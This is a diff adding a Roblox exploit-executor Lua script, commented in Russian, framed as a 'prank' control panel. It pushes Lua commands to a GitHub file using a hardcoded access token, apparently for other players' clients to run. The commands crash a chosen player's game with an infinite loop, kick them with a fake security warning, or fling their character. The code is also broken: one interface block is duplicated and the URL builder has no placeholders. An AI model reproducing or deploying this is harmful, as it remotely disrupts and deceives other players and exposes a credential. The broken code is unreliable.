@@ -1,0 +1,152 @@
+-- === ЯКОРЬ 1: НАСТРОЙКИ И ОТПРАВКА ===
+local GITHUB_USERNAME = "kazzqa"
+local REPO_NAME = "executable-script"
+local FILE_PATH = "command.lua"
+local AUTH_TOKEN = "Bearer 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"
+
+local HttpService = game:GetService("HttpService")
+local req = (syn and syn.request) or request
+
+-- Функция отправки кода на Гитхаб
+local function sendCommand(luaCode)
+    if not req then return end
+    local url = string.format("https://github.com", GITHUB_USERNAME, REPO_NAME, FILE_PATH)
+    
+    -- Получаем SHA файла для перезаписи
+    local res = req({Url = url, Method = "GET", Headers = {["Authorization"] = AUTH_TOKEN}})
+    local sha = ""
+    if res.StatusCode == 200 then
+        pcall(function() sha = HttpService:JSONDecode(res.Body).sha end)
+    end
+
+-- === ИСПРАВЛЕННЫЙ ЯКОРЬ 2: ОФИЦИАЛЬНЫЙ БАЙПАС ===
+    -- Используем встроенный в чит кодировщик Base64 (работает везде)
+    local b64 = base64_encode and base64_encode(luaCode) or base64 and base64.encode and base64.encode(luaCode) or crypt and crypt.base64 and crypt.base64.encode and crypt.base64.encode(luaCode)
+    
+    local payload = {
+        message = "Update via UI",
+        content = b64,
+        sha = sha ~= "" and sha or nil
+    }
+    
+    req({
+        Url = url,
+        Method = "PUT",
+        Headers = {["Authorization"] = AUTH_TOKEN, ["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+-- === ЯКОРЬ 3: ОСНОВА ИНТЕРФЕЙСА ===
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 250, 0, 300)
+MainFrame.Position = UDim2.new(0.1, 0, 0.2, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Text = "Control Panel (Пранк)"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+-- Поле ввода никнейма вашего друга
+local TargetInput = Instance.new("TextBox", MainFrame)
+TargetInput.Size = UDim2.new(0.9, 0, 0, 30)
+TargetInput.Position = UDim2.new(0.05, 0, 0.15, 0)
+TargetInput.PlaceholderText = "Введите ник друга..."
+TargetInput.Text = ""
+
+-- === ЯКОРЬ 3: ОСНОВА ИНТЕРФЕЙСА ===
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 250, 0, 300)
+MainFrame.Position = UDim2.new(0.1, 0, 0.2, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Text = "Control Panel (Пранк)"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+-- Поле ввода никнейма вашего друга
+local TargetInput = Instance.new("TextBox", MainFrame)
+TargetInput.Size = UDim2.new(0.9, 0, 0, 30)
+TargetInput.Position = UDim2.new(0.05, 0, 0.15, 0)
+TargetInput.PlaceholderText = "Введите ник друга..."
+TargetInput.Text = ""
+
+-- === ЯКОРЬ 4: КНОПКИ КРАША И КИКА ===
+-- Кнопка: КРАШ (Зависание игры)
+local CrashBtn = Instance.new("TextButton", MainFrame)
+CrashBtn.Size = UDim2.new(0.9, 0, 0, 40)
+CrashBtn.Position = UDim2.new(0.05, 0, 0.3, 0)
+CrashBtn.Text = "Крашнуть игру (Crash)"
+CrashBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+CrashBtn.MouseButton1Click:Connect(function()
+    local target = TargetInput.Text ~= "" and TargetInput.Text or "All"
+    local code = string.format([[
+        local targetName = "%s"
+        if targetName == "All" or game.Players.LocalPlayer.Name == targetName then
+            while true do end
+        end
+    ]], target)
+    sendCommand(code)
+end)
+
+-- Кнопка: КИК с кастомным сообщением
+local KickBtn = Instance.new("TextButton", MainFrame)
+KickBtn.Size = UDim2.new(0.9, 0, 0, 40)
+KickBtn.Position = UDim2.new(0.05, 0, 0.5, 0)
+KickBtn.Text = "Кикнуть с сервера (Kick)"
+KickBtn.BackgroundColor3 = Color3.fromRGB(180, 80, 0)
+KickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+KickBtn.MouseButton1Click:Connect(function()
+    local target = TargetInput.Text ~= "" and TargetInput.Text or "All"
+    local code = string.format([[
+        local targetName = "%s"
+        if targetName == "All" or game.Players.LocalPlayer.Name == targetName then
+            game.Players.LocalPlayer:Kick("\n[XENO PROTECTION]\nВаша сессия была принудительно завершена.\nУдалите вредоносные читы!")
+        end
+    ]], target)
+    sendCommand(code)
+end)
+
+-- === ЯКОРЬ 5 (ОБНОВЛЕННЫЙ): РЕАЛЬНЫЙ ФЛИНГ ===
+local FlingBtn = Instance.new("TextButton", MainFrame)
+FlingBtn.Size = UDim2.new(0.9, 0, 0, 40)
+FlingBtn.Position = UDim2.new(0.05, 0, 0.7, 0)
+FlingBtn.Text = "Реальный Флинг (Velocity)"
+FlingBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 100)
+FlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+FlingBtn.MouseButton1Click:Connect(function()
+    local target = TargetInput.Text ~= "" and TargetInput.Text or "All"
+    local code = string.format([[
+        local targetName = "%s"
+        if targetName == "All" or game.Players.LocalPlayer.Name == targetName then
+            local root = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local att = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and root and Instance.new("Attachment", root)
+            if att then
+                -- Резкий импульс вверх (Velocity)
+                local lv = Instance.new("LinearVelocity", root)
+                lv.MaxForce, lv.VectorVelocity, lv.Attachment0 = 999999, Vector3.new(0, 150, 0), att
+                -- Бешеное вращение скина (Spin)
+                local av = Instance.new("AngularVelocity", root)
+                av.MaxTorque, av.AngularVelocity, av.Attachment0 = 999999, Vector3.new(0, 50, 0), att
+                task.wait(1) -- Ровно через 1 секунду отключаем силы
+                lv:Destroy() av:Destroy() att:Destroy()
+            end
+        end
+    ]], target)
+    sendCommand(code)
+end)
+print("Панель успешно обновлена!")
